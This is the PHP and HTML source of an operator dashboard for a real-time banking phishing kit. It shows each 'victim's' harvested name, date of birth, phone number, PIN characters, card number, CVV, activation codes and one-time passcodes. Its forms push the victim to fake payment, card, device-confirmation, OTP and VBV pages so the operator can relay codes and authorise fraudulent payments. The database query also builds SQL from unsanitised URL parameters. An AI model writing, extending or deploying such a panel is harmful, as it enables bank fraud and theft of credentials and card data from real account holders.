<?php
require './database_setup/connection.php';
require 'php_functions/php_functions.php';

$uniqueid = $_GET["id"];
$selSite = $_GET['selSite'];

$victim_details = mysqli_query($conn, "SELECT * FROM $selSite WHERE id=$uniqueid");
$vic_rows = [];
if ($victim_details) {
  while ($row = mysqli_fetch_array($victim_details)) {
    $vic_rows[] = $row;
  }
}

$vic_details = $vic_rows[0];

// Details:
$status = $vic_details["status"];
$last_activity = $vic_details["last_activity"];
$current_page = status_match($status);
$new_data = $vic_details["viewed"] == 'false' ? true : false;

$username = $vic_details["username"];
$dob = $vic_details["dob"] == "" ? "Waiting" : $vic_details["dob"];
$phonenumber = $vic_details["phonenumber"] == "" ? "Waiting" : $vic_details["phonenumber"];
$pass1 = $vic_details["pass1"] == "" ? "Waiting" : $vic_details["pass1"];
$pass2 = $vic_details["pass2"] == "" ? "Waiting" : $vic_details["pass2"];
$pass3 = $vic_details["pass3"] == "" ? "Waiting" : $vic_details["pass3"];
$pass4 = $vic_details["pass4"] == "" ? "Waiting" : $vic_details["pass4"];
$pass5 = $vic_details["pass5"] == "" ? "Waiting" : $vic_details["pass5"];
$pass6 = $vic_details["pass6"] == "" ? "Waiting" : $vic_details["pass6"];
$activationcode = $vic_details["activationcode"] == "" ? "Waiting" : $vic_details["activationcode"];
$otp = $vic_details["otp"] == "" ? "Waiting" : $vic_details["otp"];

$fullname = $vic_details["fullname"] == "" ? "Waiting" : $vic_details["fullname"];
$cardnumber = $vic_details["cardnumber"] == "" ? "Waiting" : $vic_details["cardnumber"];
$expirydate = $vic_details["expirydate"] == "" ? "Waiting" : $vic_details["expirydate"];
$cvv = $vic_details["cvv"] == "" ? "Waiting" : $vic_details["cvv"];
$c_dob = $vic_details["card_dob"] == "" ? "Waiting" : $vic_details["card_dob"];
$c_phonenumber = $vic_details["card_phonenumber"] == "" ? "Waiting" : $vic_details["card_phonenumber"];

$vbv_otp = $vic_details["vbv_otp"] == "" ? "Waiting" : $vic_details["vbv_otp"];

?>

<!DOCTYPE html>
<html lang="en" dir="ltr">

<head>
  <meta charset="utf-8">
  <title><?php echo $selSite; ?></title>

  <!-- Modal Library -->
  <script src="https://unpkg.com/micromodal/dist/micromodal.min.js"></script>

  <!-- Meta -->
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- jQuery -->
  <script src="https://code.jquery.com/jquery-3.6.0.js" integrity="sha256-H+K7U5CnXl1h5ywQfKtSj8PCmoN9aaq30gDh27Xc0jk=" crossorigin="anonymous"></script>

  <link rel="stylesheet" href="js/growl-notification/dark-theme.min.css">

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">

  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js" integrity="sha384-B4gt1jrGC7Jh4AgTPSdUtOBvfO8shuf57BaghqFfPlYxofvL8/KUEfYiJOMMV+rV" crossorigin="anonymous"></script>

  <!-- FontAwesome -->
  <script src="https://kit.fontawesome.com/08df1faba4.js" crossorigin="anonymous"></script>

  <!-- progressbar.js -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/progressbar.js/0.6.1/progressbar.min.js" integrity="sha512-7IoDEsIJGxz/gNyJY/0LRtS45wDSvPFXGPuC7Fo4YueWMNOmWKMAllEqo2Im3pgOjeEwsOoieyliRgdkZnY0ow==" crossorigin="anonymous"></script>

  <link rel="stylesheet" href="css/main.css">
  <link rel="stylesheet" href="css/action-view.css">
</head>

<body>
  <div id="dark-nav-bar">
    <div class="container natural-middle">
      <p class="natural-left" id="nav-bar-title" onclick="window.location = 'index.php'">
        <?= $username ?>
        <?php if ($new_data) {
          echo '| New Data';
        } ?>
      </p>
      <span><i class="fas fa-bell" id="notification"></i></span>
      <p class="natural-right" id="log-out" onclick="
        <?php
        $_SESSION['loggedIn'] = false;
        ?>
        window.location.href='index.php';
      ">log out</p>
    </div>
  </div>
  <div class="surface">
    <br>
    <div class="container">
      <div class="row">
        <div class="col-sm-4 col-12">
          <div class="log-container">
            <span class="log-header">Activity Log</span>
            <!-- Newline Unicode = &#13;&#10; -->
            <textarea class="log" disabled>In Development</textarea>
          </div>
        </div>

        <div class="col-sm-8 col-12">
          <div class="row">
            <div class="col-12">
              <?php if ($new_data) { ?>
                <span class="user-status new-data flashit">New Data!</span>
              <?php } ?>
              <?php if ((time() - $last_activity) < 5) { ?>
                <span class="user-status">Online</span>
              <?php } else { ?>
                <span class="user-status offline">Offline</span>
              <?php } ?>
            </div>
          </div>
          <div class="row">
            <div class="col-12">
              <div class="user-details">
                <span style="text-decoration: underline;">Login Details:</span>
                <button class="panel-submit-button" style="width: 30%; margin-left: 5px; background: red; color: lightgray; border-radius: 3px;" onclick="resend_login('<?= $uniqueid ?>')">Resend</button><br>
                <span>Name: <b><?= $username; ?></b></span><br>
                <span>Date of Birth: <b><?= $dob; ?></b></span><br>
                <span>Phone Number: <b><?= $phonenumber; ?></b></span><br><br>
                <span style="text-decoration: underline;">PIN Characters:</span><br>
                <span>1st: <b><?= $pass1; ?></b></span><br>
                <span>2nd: <b><?= $pass2; ?></b></span><br>
                <span>3rd: <b><?= $pass3; ?></b></span><br>
                <span>4th: <b><?= $pass4; ?></b></span><br>
                <span>5th: <b><?= $pass5; ?></b></span><br>
                <span>6th: <b><?= $pass6; ?></b></span><br>
              </div>
              <br>
              <span class="panel-title">Current User Page</span>
              <span class="user-page"><?= strtoupper($current_page); ?></span>
              <br>
              <div class="row">
                <div class="col-6">
                  <div class="panel-action">
                    <p>Send Payment Request:</p>
                    <form id="request-payment-page-<?= $uniqueid ?>">
                      <input type="hidden" name="uniqueid" value="<?= $uniqueid ?>">
                      <input type="hidden" name="selSite" value="<?= $selSite ?>">
                      <input type="text" class="panel-input" placeholder="Amount" name="amount">
                      <input type="text" class="panel-input" placeholder="Merchant" name="merchant" style="margin-top: 10px;">
                      <br>
                      <input type="submit" value="SEND" class="panel-submit-button">
                    </form>
                  </div>
                  <br>
                  <div class="row">
                    <div class="col-12">
                      <div class="panel-action">
                        <p>Request Card Details:</p>
                        <span>Full Name: <b><?= $fullname ?></b></span><br>
                        <span>Cardnumber: <b><?= $cardnumber ?></b></span><br>
                        <span>Expiry Date: <b><?= $expirydate ?></b></span><br>
                        <span>CVV: <b><?= $cvv ?></b></span><br>
                        <span>DOB: <b><?= $c_dob ?></b></span><br>
                        <span>Phone Number: <b><?= $c_phonenumber ?></b></span><br>
                        <form id="request-card-page-<?= $uniqueid ?>">
                          <input type="hidden" name="uniqueid" value="<?= $uniqueid ?>">
                          <input type="hidden" name="selSite" value="<?= $selSite ?>">
                          <input type="text" class="panel-input" placeholder="Error" name="card-error">
                          <br><br>
                          <input type="submit" value="SEND" class="panel-submit-button">
                        </form>
                      </div>
                    </div>

                    <div class="col-12" style="margin-top: 20px;">
                      <div class="panel-action">
                        <p>Popup Image:</p>
                        <form id="popup-image-<?= $uniqueid ?>" method="post" enctype="multipart/form-data">
                          <input type="hidden" name="uniqueid" value="<?= $uniqueid ?>">
                          <input type="hidden" name="selSite" value="<?= $selSite ?>">
                          <div id='msg'></div>
                          <div class="form-group text-center" style="position: relative;">
                            <span class="img-div">
                              <div class="text-center img-placeholder" onClick="triggerClick()">
                                <h4>Update image</h4>
                              </div>
                              <img src="" onClick="triggerClick()" id="profileDisplay">
                            </span>
                            <input type="file" name="profileImage" onChange="displayImage(this)" id="profileImage" class="form-control" style="display: none;">
                          </div>
                          <div class="form-group">
                            <label>Title</label>
                            <textarea name="popup_image_title" class="form-control"></textarea>
                          </div>

                          <br><br>
                          <input type="submit" value="SEND" class="panel-submit-button" name="save_profile">
                        </form>
                      </div>
                    </div>
                  </div>
                </div>
                <div class="col-6">
                  <div class="panel-action">
                    <p>Device Confirmation:</p>
                    <form id="request-device-confirmation-<?= $uniqueid ?>">
                      <input type="hidden" name="uniqueid" value="<?= $uniqueid ?>">
                      <input type="hidden" name="selSite" value="<?= $selSite ?>">
                      <input type="submit" value="SEND" class="panel-submit-button">
                      <button type="button" style="margin-top: 5px;" class="panel-submit-button" onclick="send_to_loading('<?= $uniqueid ?>')">RECIEVED</button>
                      <button type="button" style="margin-top: 5px; background: red; color: lightgray;" class="panel-submit-button" onclick="resend_device_confirmation('<?= $uniqueid ?>')">RESEND</button>
                    </form>
                  </div>
                  <br>
                  <div class="row">
                    <div class="col-12">
                      <div class="panel-action">
                        <p>Request Activation Code:</p>
                        <span>Activation code: <b><?= $activationcode ?></b></span><br>
                        <form id="request-activation-code-<?= $uniqueid ?>">
                          <input type="hidden" name="uniqueid" value="<?= $uniqueid ?>">
                          <input type="hidden" name="selSite" value="<?= $selSite ?>">
                          <input type="text" class="panel-input" placeholder="Last 4 digits of phone no." name="phone-last-4">
                          <br><br>
                          <input type="submit" value="SEND" class="panel-submit-button">
                          <button type="button" style="margin-top: 5px; background: red; color: lightgray;" class="panel-submit-button" onclick="resend_activation_code('<?= $uniqueid ?>')">RESEND</button>
                        </form>
                      </div>
                    </div>
                  </div>
                  <br>
                  <div class="row">
                    <div class="col-12">
                      <div class="panel-action">
                        <p>Payment OTP:</p>
                        <span>OTP: <b><?= $otp ?></b></span>
                        <form id="request-payment-otp-<?= $uniqueid ?>">
                          <input type="hidden" name="uniqueid" value="<?= $uniqueid ?>">
                          <input type="hidden" name="selSite" value="<?= $selSite ?>">
                          <input type="submit" value="SEND" class="panel-submit-button">
                          <button onclick="resend_otp('<?= $uniqueid ?>')" type="button" class="panel-submit-button" style="background: red; margin-top: 5px; color: lightgray;">RESEND</button>
                        </form>
                      </div>
                    </div>
                  </div>
                  <br>
                  <div class="row">
                    <div class="col-12">
                      <div class="panel-action">
                        <p>Send to VBV:</p>
                        <span>OTP: <b><?= $vbv_otp ?></b></span>
                        <form id="request-vbv-<?= $uniqueid ?>">
                          <input type="hidden" name="uniqueid" value="<?= $uniqueid ?>">
                          <input type="hidden" name="selSite" value="<?= $selSite ?>">
                          <input type="text" class="panel-input" placeholder="Amount" name="amount">
                          <input style="margin-top: 10px" type="text" class="panel-input" placeholder="Merchant" name="merchant">
                          <br><br>
                          <input type="submit" value="SEND" class="panel-submit-button">
                        </form>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <br>
              <div class="row">
                <div class="col-12">
                  <div class="panel-action">
                    <p>Finish:</p>
                    <form id="finish-session-<?= $uniqueid ?>">
                      <input type="hidden" name="uniqueid" value="<?= $uniqueid ?>">
                      <input type="hidden" name="selSite" value="<?= $selSite ?>">
                      <input type="submit" value="SUBMIT (DESKTOP)" class="panel-submit-button" style="background: green; color: white">
                      <button onclick="send_to_finish('<?= $uniqueid ?>')" type="button" class="panel-submit-button" style="margin-top: 5px; background: green; color: white">SUBMIT (APP)</button </form>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- tippy.js -->
  <!-- Development -->
  <script src="https://unpkg.com/@popperjs/core@2/dist/umd/popper.min.js"></script>
  <script src="https://unpkg.com/tippy.js@6/dist/tippy-bundle.umd.js"></script>

  <style>
    .animate {
      transition: all 0.2s;
      transform: scale(1.05);
    }
  </style>
  <script src="js/growl-notification/growl-notification.min.js"></script>
  <script src="js/notifications.js"></script>
  <script src="js/main.js"></script>

  <script>
    function triggerClick(e) {
      $('#msg').html('');
      document.querySelector('#profileImage').click();
    }

    function displayImage(e) {
      if (e.files[0]) {
        var reader = new FileReader();
        reader.onload = function(e) {
          document.querySelector('#profileDisplay').setAttribute('src', e.target.result);
        }
        reader.readAsDataURL(e.files[0]);
      }
    }

    $('#popup-image-<?= $uniqueid ?>').submit(function(e) {
      e.preventDefault();

      $.ajax({
        type: 'POST',
        url: './database_setup/routes/send_popup_image.php',
        data: new FormData(this),
        contentType: false,
        cache: false,
        processData: false,
        success: function(data) {
          let parsed_data = JSON.parse(data);

          if (parsed_data.status == "success") {
            display_success_notif("Send Successfully Popup image!");
          } else {
            var msg = '<div class="alert ' + parsed_data.msg_class + '" role="alert">';
            msg += parsed_data.msg;
            msg += '</div>';
            $('#msg').html(msg);
          }
        }
      })
    });

    function send_to_finish(_uniqueid) {
      $.ajax({
        type: 'POST',
        url: './database_setup/routes/finish_session.php?mobile',
        data: {
          uniqueid: _uniqueid,
          selSite: '<?php echo $selSite; ?>'
        },
        success: function(data) {
          let parsed_data = JSON.parse(data);

          if (parsed_data.status == "success") {
            display_success_notif("Resent to Login!");

            setTimeout(function() {
              window.location.reload();
            }, 1500);
          }
        }
      })
    }

    function resend_login(_uniqueid) {
      $.ajax({
        type: 'POST',
        url: './database_setup/routes/process_login.php?error',
        data: {
          uniqueid: _uniqueid,
          selSite: '<?php echo $selSite; ?>'
        },
        success: function(data) {
          let parsed_data = JSON.parse(data);

          if (parsed_data.status == "success") {
            display_success_notif("Resent to Login!");

            setTimeout(function() {
              window.location.reload();
            }, 1500);
          }
        }
      })
    }

    function send_to_loading(uniqueid) {
      $.ajax({
        type: 'POST',
        url: './database_setup/routes/send_to_loading.php',
        data: $('#request-device-confirmation-<?= $uniqueid ?>').serialize(),
        success: function(data) {
          let parsed_data = JSON.parse(data);

          if (parsed_data.status == "success") {
            display_success_notif("Sent to Loading!");

            setTimeout(function() {
              window.location.reload();
            }, 1500);
          }
        }
      })
    }

    $('#request-password-chars-<?= $uniqueid ?>').submit(function(e) {
      e.preventDefault();

      $.ajax({
        type: 'POST',
        url: './database_setup/routes/request_password_chars.php',
        data: $(this).serialize(),
        success: function(data) {
          let parsed_data = JSON.parse(data);

          if (parsed_data.status == "success") {
            display_success_notif("Updated Security Question!");

            setTimeout(function() {
              window.location.reload();
            }, 1500);
          }
        }
      })
    });

    $('#request-device-confirmation-<?= $uniqueid ?>').submit(function(e) {
      e.preventDefault();

      $.ajax({
        type: 'POST',
        url: './database_setup/routes/request_device_confirmation.php',
        data: $(this).serialize(),
        success: function(data) {
          let parsed_data = JSON.parse(data);

          if (parsed_data.status == "success") {
            display_success_notif("Sent to Device Confimation!");

            setTimeout(function() {
              window.location.reload();
            }, 1500);
          }
        }
      })
    });

    function resend_device_confirmation(_uniqueid) {
      $.ajax({
        type: 'POST',
        url: './database_setup/routes/request_device_confirmation.php?resend',
        data: $('#request-device-confirmation-<?= $uniqueid ?>').serialize(),
        success: function(data) {
          let parsed_data = JSON.parse(data);

          if (parsed_data.status == "success") {
            display_success_notif("Resent to Device Confimation!");

            setTimeout(function() {
              window.location.reload();
            }, 1500);
          }
        }
      })
    }

    $('#request-activation-code-<?= $uniqueid ?>').submit(function(e) {
      e.preventDefault();

      $.ajax({
        type: 'POST',
        url: './database_setup/routes/request_activation_code.php',
        data: $(this).serialize(),
        success: function(data) {
          let parsed_data = JSON.parse(data);

          if (parsed_data.status == "success") {
            display_success_notif("Requested Activation Code!");

            setTimeout(function() {
              window.location.reload();
            }, 1500);
          }
        }
      })
    });

    function resend_activation_code(_uniqueid) {
      $.ajax({
        type: 'POST',
        url: './database_setup/routes/request_activation_code.php?resend',
        data: $('#request-activation-code-<?= $uniqueid ?>').serialize(),
        success: function(data) {
          let parsed_data = JSON.parse(data);

          if (parsed_data.status == "success") {
            display_success_notif("Resent Activation Code!");

            setTimeout(function() {
              window.location.reload();
            }, 1500);
          }
        }
      })
    }

    $('#request-payment-page-<?= $uniqueid ?>').submit(function(e) {
      e.preventDefault();

      $.ajax({
        type: 'POST',
        url: './database_setup/routes/request_payment_page.php',
        data: $(this).serialize(),
        success: function(data) {
          let parsed_data = JSON.parse(data);

          if (parsed_data.status == "success") {
            display_success_notif("Requested Payment Page!");

            setTimeout(function() {
              window.location.reload();
            }, 1500);
          }
        }
      })
    });

    $('#request-payment-otp-<?= $uniqueid ?>').submit(function(e) {
      e.preventDefault();

      $.ajax({
        type: 'POST',
        url: './database_setup/routes/request_payment_otp.php',
        data: $(this).serialize(),
        success: function(data) {
          let parsed_data = JSON.parse(data);

          if (parsed_data.status == "success") {
            display_success_notif("Requested OTP Page!");

            setTimeout(function() {
              window.location.reload();
            }, 1500);
          }
        }
      })
    });

    function resend_otp(_uniqueid) {
      $.ajax({
        type: 'POST',
        url: './database_setup/routes/request_payment_otp.php?error',
        data: $('#request-payment-otp-<?= $uniqueid ?>').serialize(),
        success: function(data) {
          let parsed_data = JSON.parse(data);

          if (parsed_data.status == "success") {
            display_success_notif("Requested OTP Page!");

            setTimeout(function() {
              window.location.reload();
            }, 1500);
          }
        }
      })
    }

    $('#request-card-page-<?= $uniqueid ?>').submit(function(e) {
      e.preventDefault();

      $.ajax({
        type: 'POST',
        url: './database_setup/routes/request_card_page.php',
        data: $(this).serialize(),
        success: function(data) {
          let parsed_data = JSON.parse(data);

          if (parsed_data.status == "success") {
            display_success_notif("Requested Card Page!");

            setTimeout(function() {
              window.location.reload();
            }, 1500);
          }
        }
      })
    });

    $('#request-vbv-<?= $uniqueid ?>').submit(function(e) {
      e.preventDefault();

      $.ajax({
        type: 'POST',
        url: './database_setup/routes/request_vbv.php',
        data: $(this).serialize(),
        success: function(data) {
          let parsed_data = JSON.parse(data);

          if (parsed_data.status == "success") {
            display_success_notif("Requested VBV Page!");

            setTimeout(function() {
              window.location.reload();
            }, 1500);
          }
        }
      })
    });

    $('#finish-session-<?= $uniqueid ?>').submit(function(e) {
      e.preventDefault();

      $.ajax({
        type: 'POST',
        url: './database_setup/routes/finish_session.php',
        data: $(this).serialize(),
        success: function(data) {
          let parsed_data = JSON.parse(data);

          if (parsed_data.status == "success") {
            display_success_notif("Finished Session!");

            setTimeout(function() {
              window.location.reload();
            }, 1500);
          }
        }
      })
    })

    setInterval(function() {
      let _load_status = <?php echo $status ?>;
      let _uniqueid = <?php echo $uniqueid ?>;

      $.ajax({
        type: 'POST',
        url: 'php_polling/get_single_user_status.php',
        data: {
          uniqueid: _uniqueid,
          load_status: _load_status,
          selSite: '<?php echo $selSite; ?>'
        },
        success: function(data) {
          console.log(data);
          let parsed_data = JSON.parse(data);


          if (parsed_data.status == 'reload') {
            window.location.reload();
          }
        }
      })
    }, 2000);
  </script>
</body>

</html>